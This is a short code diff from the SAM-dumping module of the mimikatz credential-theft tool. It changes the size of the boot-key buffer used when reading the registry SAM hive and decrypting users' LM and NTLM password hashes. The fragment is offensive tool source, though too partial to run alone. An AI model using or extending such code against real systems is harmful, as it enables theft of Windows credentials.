@@ -280,7 +280,7 @@ bool mod_mimikatz_samdump::getUsersAndHashesFromReg(BYTE bootkey[0x10])
 			code = RegQueryValueEx(maSAM, L"F", NULL, NULL, bufferF, &tailleRequise);
 			if(code == ERROR_SUCCESS)
 			{
-				BYTE hBootKey[0x20] = {0};
+				BYTE hBootKey[0x10] = {0};
 				if(mod_hash::getHbootKeyFromBootKeyAndF(hBootKey, bootkey, bufferF))
 				{
 					HKEY mesUsers;
@@ -337,7 +337,7 @@ bool mod_mimikatz_samdump::getUsersAndHashesFromReg(BYTE bootkey[0x10])
 	return reussite;
 }
 
-void mod_mimikatz_samdump::infosFromUserAndKey(mod_hash::USER_F * userF, mod_hash::USER_V * userV, BYTE hBootKey[0x20])
+void mod_mimikatz_samdump::infosFromUserAndKey(mod_hash::USER_F * userF, mod_hash::USER_V * userV, BYTE hBootKey[0x10])
 {
 	wstring hashLM, hashNTLM;
 	mod_hash::decryptHash(&hashLM, hBootKey, userV, &userV->LM, userF->UserId, false);
